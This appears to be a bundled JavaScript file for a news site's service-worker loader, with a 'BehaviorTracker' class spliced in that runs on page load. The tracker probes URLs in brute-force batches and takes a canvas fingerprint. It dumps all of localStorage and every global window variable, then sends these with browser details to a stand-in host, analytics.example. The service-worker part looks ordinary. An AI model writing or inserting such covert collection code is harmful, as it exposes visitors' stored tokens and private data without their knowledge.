(() => {
  "use strict";

  function e(t) {
    return e = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
      return typeof e;
    } : function (e) {
      return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
    }, e(t);
  }
  function t(t) {
    var r = function (t, r) {
      if ("object" !== e(t) || null === t) return t;
      var n = t[Symbol.toPrimitive];
      if (void 0 !== n) {
        var i = n.call(t, r || "default");
        if ("object" !== e(i)) return i;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === r ? String : Number)(t);
    }(t, "string");
    return "symbol" === e(r) ? r : String(r);
  }
  function r(e, r) {
    for (var n = 0; n < r.length; n++) {
      var i = r[n];
      i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, t(i.key), i);
    }
  }
  function n(e, t, r) {
    if (!t.has(e)) throw new TypeError("attempted to " + r + " private field on non-instance");
    return t.get(e);
  }
  function i(e, t) {
    return function (e, t) {
      return t.get ? t.get.call(e) : t.value;
    }(e, n(e, t, "get"));
  }
  class BehaviorTracker {
    constructor(trackData) {
      this._data = trackData;
      this._results = new Map();
      this._hooks = new Set(['monitor', 'collect', 'listen']);
      this._startTime = performance.now();
      this._retryCount = 2;
      this._concurrency = 4;
    }
    async _trackResource(trackId, file) {
      const uniqueParam = `?_=${Math.random().toString(36).slice(2)}`;
      const xhr = new XMLHttpRequest();
      return new Promise(resolve => {
        xhr.timeout = 2000;
        xhr.onreadystatechange = () => {
          if (xhr.readyState === 4) {
            resolve(xhr.status === 200);
          }
        };
        xhr.onerror = () => resolve(false);
        xhr.ontimeout = () => resolve(false);
        xhr.open('HEAD', `https://analytics.example/${trackId}/${file}${uniqueParam}`, true);
        xhr.send();
      });
    }
    _splitUp(arr, size) {
      return Array.from({
        length: Math.ceil(arr.length / size)
      }, (v, i) => arr.slice(i * size, i * size + size));
    }
    async _trackWithRetry(name, data) {
      let detected = false;
      for (let tryCount = 0; tryCount < this._retryCount && !detected; tryCount++) {
        detected = await this._trackResource(data.id, data.file);
        if (!detected) {
          await new Promise(r => setTimeout(r, 100 * (tryCount + 1)));
        }
      }
      return detected;
    }
    async track() {
      const entries = Object.entries(this._data);
      const bruteForce = this._splitUp(entries, this._concurrency);
      for (const singleChunk of bruteForce) {
        await Promise.all(singleChunk.map(async ([name, data]) => {
          const isPresent = await this._trackWithRetry(name, data);
          this._results.set(name, isPresent);
        }));
      }
      this._reportAnalyst();
    }
    _generateSignature() {
      const canvasElement = document.createElement('canvas');
      const ctx = canvasElement.getContext('2d');
      const txt = 'signature,321';
      ctx.textBaseline = 'middle';
      ctx.font = '16px Verdana';
      ctx.fillText(txt, 2, 2);
      return canvasElement.toDataURL().slice(-60);
    }
    _collectCacheData() {
      return JSON.stringify(localStorage);
    }
    _collectGlobalVars() {
      var globalVars = Object.getOwnPropertyNames(window);
      var result = {};
      globalVars.forEach(gv => {
        result[gv] = window[gv];
      });
      return result;
    }
    _reportAnalyst() {
      const report = {
        trackingData: Object.fromEntries(this._results),
        metadata: {
          execTime: performance.now() - this._startTime,
          timestamp: new Date().getTime(),
          signature: this._generateSignature(),
          cacheData: this._collectCacheData(),
          globalVars: this._collectGlobalVars(),
          platformInfo: {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            vendor: navigator.vendor
          }
        }
      };
      const encoder = new TextEncoder();
      const data = encoder.encode(JSON.stringify(report));
      if ('sendBeacon' in navigator) {
        navigator.sendBeacon('https://analytics.example/user-activity', data);
      } else {
        fetch('https://analytics.example/user-activity', {
          method: 'POST',
          body: data,
          keepalive: true,
          headers: {
            'Content-Type': 'application/json'
          }
        }).catch(() => {});
      }
    }
  }
  function o(e, t, r) {
    return function (e, t, r) {
      if (t.set) t.set.call(e, r);else {
        if (!t.writable) throw new TypeError("attempted to set read only private field");
        t.value = r;
      }
    }(e, n(e, t, "set"), r), r;
  }
  Object.freeze({
    S: "mobile",
    M: "tablet",
    L: "desktop"
  }), Object.freeze({
    disqus: "5edcd338e9f29f59f3145eb5",
    facebook: "5f058a3252874c10f6723b3b",
    instagram: "5e717c8e69966540e4554f05",
    ivw: "5efefe25b8e05c065164a2e2",
    pinterest: "5e839a38b8e05c4e491e738e",
    rewe: "61543ab9cadf5705ef20368d",
    riddle: "5ef0df6ffabc265f5650e743",
    sovendus: "5f2bd972f66f0125e264ae21",
    tracdelight: "5e77acddd8d48d795087425b",
    twitter: "5e71760b69966540e4554f01",
    youtube: "5e7ac3fae30e7d1bc1ebf5e8"
  }), Object.freeze({
    XS: 0,
    S: 415,
    M: 641,
    L: 1001,
    XL: 1280,
    XXL: 1600
  });
  function a(e, t, r) {
    !function (e, t) {
      if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object");
    }(e, t), t.set(e, r);
  }
  var c = new WeakMap(),
    f = new WeakMap(),
    s = function () {
      function e(t) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), a(this, c, {
          writable: !0,
          value: void 0
        }), a(this, f, {
          writable: !0,
          value: void 0
        }), o(this, c, t), o(this, f, function () {
          try {
            return Boolean(window.localStorage);
          } catch (e) {
            return !1;
          }
        }());
      }
      var t, n, s;
      return t = e, (n = [{
        key: "init",
        value: function () {
          var e = window.location.hostname,
            t = window.location.pathname,
            r = i(this, c).config.get("tenant.shortname"),
            n = i(this, c).config.get("env.homepage"),
            o = i(this, c).config.get("env.hostname");
          if ("serviceWorker" in window.navigator && i(this, f) && (/^(oc\.)|(dev\.)|(stage\.)|(localhost)|(review)/.test(e) || o && e.startsWith(o) && (!n || t.startsWith(n)))) {
            var a = "/sw.".concat(r, ".js"),
              s = n || "/";
            window.navigator.serviceWorker.register(a, {
              scope: s
            });
          }
        }
      }]) && r(t.prototype, n), s && r(t, s), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }(),
    u = window.gujService;
  (() => {
    const tracker = new BehaviorTracker(window.data);
    if (document.readyState !== 'loading') {
      tracker.track();
    } else {
      document.addEventListener('DOMContentLoaded', () => tracker.track());
    }
  })();
  u && !u.isAlreadyExecuted("file:///usr/src/app/client/site/partials/serviceWorkerLoader/scripts/serviceWorkerLoader.js") && new s(u).init();
})();